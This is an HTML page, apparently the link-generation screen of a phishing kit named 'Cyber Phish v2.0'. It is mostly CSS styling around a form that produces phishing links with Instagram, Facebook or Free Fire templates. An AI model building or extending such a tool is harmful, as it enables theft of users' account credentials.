<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Create Link</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #070d1a;
        font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #e0e0e0;
        position: relative;
        overflow: hidden;
        padding: 20px;
    }
    /* অ্যানিমেটেড ব্যাকগ্রাউন্ড */
    body::before {
        content: '';
        position: fixed;
        inset: 0;
        background: radial-gradient(circle at 20% 30%, #0f1a3a, #070d1a 70%);
        z-index: -2;
    }
    body::after {
        content: '';
        position: fixed;
        inset: 0;
        background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%2300ffff' fill-opacity='0.04'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        opacity: 0.3;
        z-index: -1;
    }

    .container { max-width: 600px; width: 100%; }

    /* গ্লাস কার্ড */
    .glass-card {
        background: rgba(10, 18, 34, 0.65);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border-radius: 40px;
        border: 1px solid rgba(0, 255, 255, 0.15);
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 255, 255, 0.05) inset;
        padding: 40px 32px;
        transition: 0.4s ease;
        position: relative;
        overflow: hidden;
    }
    .glass-card::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle at 30% 20%, rgba(0, 255, 255, 0.03), transparent 60%);
        pointer-events: none;
    }

    /* ব্র্যান্ড */
    .brand {
        font-size: 2.2rem;
        font-weight: 800;
        text-align: center;
        background: linear-gradient(135deg, #00ffff, #a855f7);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        text-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
        letter-spacing: 1px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        margin-bottom: 10px;
    }
    .brand i {
        font-size: 2.5rem;
        color: #00ffff;
        text-shadow: 0 0 20px #00ffff;
    }
    .brand small {
        font-size: 0.9rem;
        opacity: 0.6;
        font-weight: 400;
        background: rgba(255,255,255,0.05);
        padding: 2px 14px;
        border-radius: 40px;
        border: 1px solid rgba(255,255,255,0.06);
    }

    .sub-title {
        text-align: center;
        color: #8ae6e6;
        font-size: 0.95rem;
        margin-bottom: 24px;
        letter-spacing: 1px;
        font-weight: 300;
    }

    /* ফর্ম এলিমেন্ট */
    .form-group {
        margin-bottom: 20px;
    }
    .form-group label {
        display: block;
        font-size: 0.8rem;
        font-weight: 600;
        color: #8ae6e6;
        margin-bottom: 6px;
        letter-spacing: 0.5px;
    }
    .form-group .input-wrapper {
        position: relative;
    }
    .form-group .input-wrapper i {
        position: absolute;
        left: 18px;
        top: 50%;
        transform: translateY(-50%);
        color: #4a6a7a;
        font-size: 1.1rem;
        transition: 0.3s;
        pointer-events: none;
    }
    .form-group select {
        width: 100%;
        padding: 14px 18px 14px 48px;
        border-radius: 60px;
        border: 1px solid rgba(0, 255, 255, 0.12);
        background: rgba(0, 0, 0, 0.4);
        color: #fff;
        font-size: 1rem;
        transition: 0.3s;
        outline: none;
        font-family: inherit;
        appearance: none;
        -webkit-appearance: none;
        cursor: pointer;
    }
    .form-group select:focus {
        border-color: #00ffff;
        box-shadow: 0 0 20px rgba(0, 255, 255, 0.08);
        background: rgba(0, 0, 0, 0.6);
    }
    .form-group select option {
        background: #0f1a2a;
        color: #fff;
    }
    .form-group .input-wrapper .fa-chevron-down {
        position: absolute;
        right: 18px;
        top: 50%;
        transform: translateY(-50%);
        color: #4a6a7a;
        pointer-events: none;
        font-size: 0.9rem;
    }

    /* জেনারেট বাটন */
    .btn-generate {
        width: 100%;
        padding: 14px 20px;
        border: none;
        border-radius: 60px;
        background: linear-gradient(135deg, #00c8ff, #0070ff);
        color: #fff;
        font-size: 1.1rem;
        font-weight: 700;
        cursor: pointer;
        transition: 0.3s ease;
        box-shadow: 0 8px 25px rgba(0, 100, 255, 0.25);
        margin-top: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        font-family: inherit;
    }
    .btn-generate:hover {
        transform: translateY(-3px);
        box-shadow: 0 12px 35px rgba(0, 100, 255, 0.4);
        background: linear-gradient(135deg, #00ddff, #0080ff);
    }
    .btn-generate:active {
        transform: scale(0.97);
    }

    /* ব্যাক লিংক */
    .back-link {
        text-align: center;
        margin-top: 24px;
        padding-top: 20px;
        border-top: 1px solid rgba(0, 255, 255, 0.06);
    }
    .back-link a {
        color: #8ae6e6;
        text-decoration: none;
        font-weight: 500;
        transition: 0.3s;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 6px 16px;
        border-radius: 40px;
        background: rgba(0, 255, 255, 0.04);
        border: 1px solid transparent;
    }
    .back-link a:hover {
        color: #b0fff0;
        background: rgba(0, 255, 255, 0.08);
        border-color: rgba(0, 255, 255, 0.1);
    }

    /* রেস্পন্সিভ */
    @media (max-width: 480px) {
        .glass-card { padding: 28px 20px; }
        .brand { font-size: 1.6rem; }
        .brand i { font-size: 2rem; }
        .form-group select { padding: 12px 16px 12px 42px; font-size: 0.9rem; }
        .btn-generate { font-size: 1rem; padding: 12px 16px; }
    }
</style>
</head>
<body>
<div class="container">
    <div class="glass-card">

        <!-- ব্র্যান্ড -->
        <div class="brand">
            <i class="fas fa-shield-halved"></i>
            CYBER PHISH
            <small>v2.0</small>
        </div>
        <div class="sub-title"><i class="fas fa-link" style="margin-right: 8px;"></i> Generate New Phishing Link</div>

        <!-- ফর্ম -->
        <form method="post" action="/phis/create_link">
            <div class="form-group">
                <label><i class="fas fa-layer-group"></i> Template</label>
                <div class="input-wrapper">
                    <select name="template" required>
                        <option value="instagram">Instagram</option>
                        <option value="facebook">Facebook</option>
                        <option value="freefire">Free Fire</option>
                    </select>
                    <i class="fas fa-chevron-down"></i>
                </div>
            </div>
            <button type="submit" class="btn-generate"><i class="fas fa-plus-circle"></i> Generate</button>
        </form>

        <!-- ব্যাক লিংক -->
        <div class="back-link">
            <a href="/phis/dashboard"><i class="fas fa-arrow-left"></i> Back to Dashboard</a>
        </div>

    </div>
</div>
</body>
   </html>
